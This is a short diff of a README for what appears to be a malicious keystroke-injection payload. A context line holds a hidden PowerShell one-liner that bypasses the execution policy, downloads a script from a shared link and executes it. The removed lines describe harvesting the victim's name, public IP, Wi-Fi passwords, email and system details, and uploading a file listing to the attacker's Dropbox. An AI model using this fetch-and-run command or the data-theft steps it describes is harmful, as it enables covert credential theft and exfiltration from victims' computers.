@@ -42,11 +42,6 @@ Along with TREE list of all files in the target computer is gathered and uploade
 ```
 powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
 ```
-* Enumerate and get Full Name, Amount of RAM, Public IP, Wifi Password Length, Wifi Networks and Passwords, Day Password was last changed, Email
-* Custom responses have been programmed to roast the target based on the information gathered during enumeration phase 
-* Wifi Networks and passwords will be generated into an image that will be saved on the desktop
-* Intel on the system Info, HDDs, network interfaces, TCP connections, Processes, Services, Installed software, drivers, and video card 
-* Along with TREE list of all files in the target computer is gathered and uploaded to your DropBox cloud storage
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
